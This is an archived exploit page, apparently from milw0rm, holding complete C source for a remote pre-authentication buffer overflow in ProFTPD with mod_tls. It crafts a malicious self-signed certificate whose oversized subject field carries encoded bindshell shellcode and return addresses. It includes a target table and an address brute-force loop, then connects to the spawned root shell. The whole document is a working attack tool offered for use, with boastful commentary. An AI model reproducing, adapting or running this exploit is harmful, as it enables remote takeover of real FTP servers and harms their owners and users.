<html><head><title>ProFTPD 1.x (module mod_tls) Remote Buffer Overflow Exploit</title></head><pre>/* 
 *	*** Anti-modTLS-0day version 2 ***
 *
 * ProFTPd *.*.* + mod_tls remote-root-0day-exploit
 * 
 * main advantages of this exploit:
 *	1) No patched mod_tls versions yet
 *	2) This is a preauthentication bug
 *	3) Bruteforcing option (eheheheee)
 * main disadvantages:
 *	2) Target mechanism isn't very well, cause exploitation
 *	   depends on library mapped address, so, there are no
 *	   strict categories.
 *	1) Dunno, if there are a lot of proftpd+mod_tls boxes
 *	   outta there.
 *
 * Bug found by: netris
 * exploit written by: netris 
 *
 * -- ADD --
 *
 * Hi there. Here goes the original exploit written in 2004 
 * (not in 2006 like some of you would guess), and found by
 * netris, not Evgeny Legerov. Big middle fingers to those
 * who fight for commercial security shit system. 
 * Greets to arpunk, pandzilla, c0dak, mcb, c0de, ^sq, disque,
 * gamma, djang0 and many others of ex #phenoelit channel.
 * 
 * netris.
 *
 * mailto: netris_spam@ok.kz
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;signal.h&gt;
#include &lt;getopt.h&gt;
#include &lt;netdb.h&gt;
#include &lt;openssl/ssl.h&gt;
#include &lt;openssl/ssl3.h&gt;
#include &lt;openssl/x509.h&gt;
#include &lt;openssl/err.h&gt;

#define CODE_SZ 2322
#define DPORT 21

#define BSET(u,a,b,c,d) u = a*0x1000000;\
			u+= b*0x0010000;\
			u+= c*0x0000100;\
			u+= d*0x0000001;

#define checkz(a) int i;\
		  for(i=0;i&lt;4;i++){\
		  	if(a[i]&lt;0x20)a[i]=0x20;\
			if(a[i]&gt;0x7f)a[i]=0x7f;\
		  }

int ch,timeout=2,br=0;
 struct ADDR{
 	char *os;
        unsigned long call_reg; /* eax or edx */
};

/*bindshell, port 36864, offset 265, buf address is edx */
char shellcode[]=&quot;h22ImX522ImHRWPPSRPPaVUWWTBfRJfhdEfXf5YDfPDfh0PDTY09RUajWY&quot;
		 &quot;0Loa0toafhoXfYf1LocjxY0Loe0Toe0ToffhH0fYf1Loh0tojjFY0Lok0t&quot;
		 &quot;ok0tolfht9fXf1Don0TopjyX0Dor0TosjKX0Dou0Tov0ToxjIX0Doy0Toy&quot;
		 &quot;G0tozGGfhsCfYf1LozGG0tozGGjZY0LozGGjkX0Doz0TozGGjGX0Doz0To&quot;
		 &quot;zG0tozGGjAY0LozGf1tozGGG0tozGGjpY0LozG0tozGGjpY0LozG0TozGG&quot;
		 &quot;jfX0DozG0tozGGjRX0DozG0tozGG0TozGj8Y0Loz0tozG0TozGfhlGfYf1&quot;
		 &quot;LozGGGG0TozGG0TozGj3Y0Loz0tozG0tozGGjuX0DozG0TozGGjyY0LozG&quot;
		 &quot;0tozGGG0tozGj4Y0Loz0tozG0TozGjqX0Doz0tozG0tozGfhyCfXf1DozG&quot;
		 &quot;Gf1tozGGjFY0Loz0TozG0TozGjQY0LozGG0tozGj9Y0Loz0TozG0TozGjY&quot;
		 &quot;X0DozGG0tozGjFX0Doz0TozG0tozGGjnY0LozG0TozGGjTY0LozG0tozGj&quot;
		 &quot;gY0Loz0TozG0tozGGj4Y0LozG0TozGj9X0DozG0tozGfhKofYf1Lozf1to&quot;
		 &quot;zGG0tozGfha5fXf1Dozf1TozGGj4X0Doz0TozGjYY0LozGGGGjHY0LozCn&quot;
		 &quot;1qGvFXpvzvFxyvFqrNCOf26C9FcSwFR1T1jvFYOofvFfrNdvNjrNZOf2Gv&quot;
		 &quot;2KCCOf2LvVyvViOfC2KyMOFj629OnA2FOfA29wVivvXxkrK8O224xra54v&quot;
		 &quot;bingsh&quot;;

X509 *Create_Death_Certificate(EVP_PKEY **pkey);
void set_subject(X509 *cert, X509_NAME *subject, X509_NAME *issuer);
void DUF_add_entry(X509_NAME **subiss, char *field, 
			unsigned char *bytes, int len);
void setaddr(char *hname, struct sockaddr_in *sap, int port);
void senddata(int sock, char *data);                            
int shell(char *host,int port, struct sockaddr_in ad);
void help(char *prname);

SSL_CTX *ctx;
SSL *conn;
int sk;

void handler(){
	if(!conn-&gt;in_handshake){
		SSL_shutdown(conn);
		SSL_free(conn);
	}
	close(sk);
	exit(0);
}

void step(char *str, int err){
	static i;
	if(br)
		return;
	switch(err){
		case 0:
			fprintf(stderr,&quot;[%03d] %s\n&quot;,i+1,str);
			i++;break;
		case -1:
			fprintf(stderr,&quot;[!!!] %s\n&quot;,str);
			break;
		case 1:
			fprintf(stderr,&quot;[!!!] %s\n\t&quot;,str);
			ERR_print_errors_fp(stderr);
	}
}
/* Add targets here */
struct ADDR vict[]={
	{&quot;Bruteforce mode&quot;,0x40202020},
	{&quot;Gentoo Linux 1.4 3.2.3-r1 - openssl-0.9.7d&quot;,0x40235727},
	{&quot;Gentoo Linux 1.4.3.2.3-r1 - default install&quot;,0x40283a43},	
	{0}
};

int main(int argc, char *argv[])
{
	int port=DPORT,aa[4];
	char *host,*sport,opt;
	unsigned long saddr=0;
	struct sockaddr_in a;

	EVP_PKEY *key;
	X509 *cert=NULL;

	fprintf(stderr,&quot;--&lt; rebel-proftpd-modtls-0day\n&quot;);
	fprintf(stderr,&quot;--&lt; netris @ duffsrebelz\n\n&quot;);
	
	while((opt=getopt(argc,(void*)argv,&quot;+b:t:x&quot;))!=-1)
		switch(opt){
			case 't':timeout=atoi(optarg);break;
			case 'b':sscanf(optarg,&quot;0x%x&quot;,&amp;saddr);break;
			case 'x':ch=1;
				X509_print_fp(stderr,
					Create_Death_Certificate(&amp;key));
				exit(0);
			default:help(argv[0]);
		}
	if(argc-optind!=2)
		help(argv[0]);
	
	ch=atoi(argv[optind]);
	
	if(host=strchr(argv[optind+1],':')){
		if(!isdigit(*(host+1))){
			step(&quot;weird arguments\n&quot;,-1);
			exit(-1);
		}
		host = strtok(argv[optind+1],&quot;:&quot;);
		sport = strtok(NULL,&quot;:&quot;);
		port=atoi(sport);
	}else
		host=argv[optind+1];
	
	(ch==0)?(br=1):(br=0);
	
	SSL_library_init();	
	if(br)
		fprintf(stderr,
			&quot;--&lt; Ready, Steady, GO!!! &gt;:O\n\n&quot;);
	setaddr(host,&amp;a,port);

	if(!saddr)saddr=vict[0].call_reg;
	
	aa[3] = (saddr &gt;&gt;  0) &amp; 0xff;
	aa[2] = (saddr &gt;&gt;  8) &amp; 0xff;
	aa[1] = (saddr &gt;&gt; 16) &amp; 0xff;
	aa[0] = (saddr &gt;&gt; 24) &amp; 0xff;
	
	checkz(aa);
	
	for(;;){
	for(;aa[1]&lt;0x7e;aa[1]++){
		for(;aa[2]&lt;0x7e;aa[2]++){
			for(;aa[3]&lt;0x7e;aa[3]++){
	BSET(vict[0].call_reg,aa[0],aa[1],aa[2],aa[3]);
	fprintf(stderr,&quot;[0x%08x]\n&quot;,vict[0].call_reg);
	sk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);		
	
	cert = Create_Death_Certificate(&amp;key);
	a.sin_port=htons(port);
	a.sin_family=AF_INET;
	if((connect(sk,(struct sockaddr*)&amp;a,sizeof(a)))&lt;0){
		fprintf(stderr,&quot;[!!!] couldn't connect\n\n&quot;);
		close(sk);
		exit(-1);
	}
	
	senddata(sk,&quot;AUTH TLS\n&quot;);
	
	ctx  = SSL_CTX_new(SSLv23_client_method());
	SSL_CTX_use_certificate(ctx, cert);
	SSL_CTX_use_PrivateKey(ctx, key);

	conn = SSL_new(ctx);
	SSL_set_connect_state(conn);
	SSL_set_fd(conn,sk);
	signal(SIGINT,handler);
	step(&quot;establishing SSL connection&quot;,0);
#ifdef DEBUG
	getc(stdin);
#endif
	if(SSL_connect(conn)&lt;0){
		fprintf(stderr,&quot;[!!!] No SSL enabled on %s\n\n&quot;,host);
		exit(-1);
	}
	step(&quot;shell spawn...&quot;,0);
	if(shell(host,36864,a))
		exit(0);
	
	step(&quot;done, see ya later\n&quot;,0);
	X509_free(cert);
	if(!conn-&gt;in_handshake){
		SSL_shutdown(conn);
		SSL_free(conn);
	}						
	}aa[3]=0x20;
	}aa[2]=0x20;
	}aa[1]=0x20;
	}
	return 0;
}

X509 *Create_Death_Certificate(EVP_PKEY **key)
{
	FILE *fd;
	time_t t;

	X509_NAME *subject=NULL;
	X509_NAME *issuer=NULL;
	ASN1_TIME *tbefore,*tafter;
	ASN1_INTEGER *serial;
	X509 *dz; /* certificate */
	RSA *rsa;
	EVP_PKEY *pk;
	
	step(&quot;preparing dirty certificate&quot;,0);

  	dz = X509_new();
	
	/* private-key generation */
  	pk = EVP_PKEY_new();
  	rsa = RSA_generate_key(1024, RSA_F4, NULL,NULL); 
  	EVP_PKEY_assign_RSA(pk,rsa);
	X509_set_pubkey(dz,pk);
	
	/* version/serial */
  	X509_set_version(dz,0x2); /* version: 3 */
	serial = ASN1_INTEGER_new();
  	ASN1_INTEGER_set(serial,0x01);
	X509_set_serialNumber(dz, serial); 
		
	/* not-before/notafter validity */
	tbefore = ASN1_TIME_new();
	tafter = ASN1_TIME_new();
	ASN1_TIME_set(tbefore,t=0);
	ASN1_TIME_set(tafter,t=60*60*24*366*65);
  	X509_set_notBefore(dz, tbefore);
  	X509_set_notAfter(dz, tafter);   
	
	/* DN Subject/Issuer */
	set_subject(dz,subject,issuer);

	/* let's make it self signed */
	X509_sign(dz, pk, EVP_md5());
	
	*key=pk;
	X509_NAME_free(subject);
	ASN1_INTEGER_free(serial);
	ASN1_TIME_free(tbefore);
	ASN1_TIME_free(tafter);
	close(fd);
	return dz;
}

/* &lt;soletario&gt; yeah man */ 
void set_subject(X509 *cert, X509_NAME *subject, X509_NAME *issuer)
{
	int i;
	char dc0de[6000];
	
	memset(dc0de,0,sizeof(dc0de));
		
	for(i=0; i&lt;5000-1; i++)
		dc0de[i]='E';
	for(i=258; i&lt;258+sizeof(shellcode)-1; i++)
		dc0de[i]=shellcode[i-258];
	i+=1;
	for(; i&lt;3200; i+=4){ /* uhh, rude */
		dc0de[i+0]=(vict[ch].call_reg &gt;&gt; 0) &amp; 0xff;
		dc0de[i+1]=(vict[ch].call_reg &gt;&gt; 8) &amp; 0xff;
		dc0de[i+2]=(vict[ch].call_reg &gt;&gt;16) &amp; 0xff;
		dc0de[i+3]=(vict[ch].call_reg &gt;&gt;24) &amp; 0xff;
	}
	subject = X509_get_subject_name(cert);
	issuer = X509_get_issuer_name(cert);	
	
	DUF_add_entry(&amp;subject,&quot;host&quot;,dc0de,-1);

	X509_set_subject_name(cert,subject);
	X509_NAME_delete_entry(issuer,0);
	X509_set_issuer_name(cert,issuer);
}

/* This function can insert large fields */
void DUF_add_entry(X509_NAME **subiss, char *field, 
			unsigned char *bytes, int len)
{
	ASN1_OBJECT *obj;
	X509_NAME_ENTRY *ne;
	
	ne=X509_NAME_ENTRY_new();	
	obj=OBJ_txt2obj(field,0);
	X509_NAME_ENTRY_set_object(ne,obj);
	ASN1_mbstring_ncopy(&amp;ne-&gt;value,bytes,len,MBSTRING_ASC,0,0,0);	
	X509_NAME_add_entry(*subiss,ne,-1,0);
}

void setaddr(char *hname, struct sockaddr_in *sap, int port)
{
	struct hostent *hp;

	memset(sap,0,sizeof(*sap));
	sap-&gt;sin_family = AF_INET;

	if(!inet_aton(hname,&amp;sap-&gt;sin_addr)){
		hp = gethostbyname(hname);
		if(hp == NULL){
			step(&quot;unkown host&quot;,-1);
			return;
		}
		sap-&gt;sin_addr = *(struct in_addr *)hp-&gt;h_addr;
	}else
		sap-&gt;sin_addr.s_addr = inet_addr(hname);
	
	sap-&gt;sin_port = htons(port);
}

int shell(char *host, int port, struct sockaddr_in ad)
{
	u_char buf[4096];
    	fd_set fds;
	int sock;
	struct sockaddr_in a=ad;
	
	sock = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
	
	a.sin_family = AF_INET;
	a.sin_port = htons(port);

	if((connect(sock,(struct sockaddr*)&amp;a,sizeof(a)))&lt;0){
			 step(&quot;couldn't connect\n&quot;,-1);
			 close(sock);
			 if(!br)
			 	handler();
			 else return 0;
	}
	signal(SIGINT,SIG_IGN);
	fprintf(stderr,&quot;\n--&lt; %s just has been 0wned\n\n&quot;,host);	
        for (;;){
		FD_ZERO(&amp;fds);
		FD_SET(0, &amp;fds);
		FD_SET(sock, &amp;fds);
		fprintf(stderr,&quot;\033[31m[duffshell]#\033[0m &quot;);
		select(255, &amp;fds, NULL, NULL, NULL);
		memset(buf, 0, sizeof(buf));
		
		if (FD_ISSET(sock, &amp;fds)){
			read(sock, buf, sizeof(buf));
			fprintf(stderr, &quot;%s&quot;, buf);
		}
		if (FD_ISSET(0, &amp;fds)){
			read(0, buf, sizeof(buf));
			if(strstr(buf,&quot;exit&quot;)){
				fprintf(stderr,&quot;\n&quot;);
				return 1;
			}
			write(sock, buf, strlen(buf));        
		}    
	}
}

void senddata(int sock, char *data)
{
	int i,c=0,j;
	char au[4];
	fd_set ff;
	struct timeval tm;
	int r;
	
	FD_ZERO(&amp;ff);
	FD_SET(sock,&amp;ff);
	tm.tv_sec = timeout;
	tm.tv_usec = 30;
	memset(au,0,4);
	
	if(data){
		j=0;
			send(sock,data,strlen(data),0);
		for(;;){
			if(!(r=select(sock+1,&amp;ff,NULL,NULL,&amp;tm)))
				break;
			if((i=read(sock,&amp;c,1))&lt;=0)
				break;
		}
	}
}

void help(char *prname)
{
	int i=0;
	fprintf(stderr,&quot;usage: %s target hostname:[port]\n&quot;,prname);
	fprintf(stderr,&quot;   -t &lt;delay&gt;     :delay of data send/recv\n&quot;);
	fprintf(stderr,&quot;   -b &lt;addr&gt;      :bruteforce starting address\n&quot;);
	fprintf(stderr,&quot;   -x             :just the payload certificate and exit\n&quot;);
	fprintf(stderr,&quot;current targets:\n&quot;);
	for(i=0;vict[i].call_reg;i++)
		fprintf(stderr,&quot;   %d) %s ( %08x )\n&quot;,i,
					     vict[i].os,
					     vict[i].call_reg);
	putc('\n',stderr);
	exit(-1);
}

// milw0rm.com [2007-08-24]</pre></html>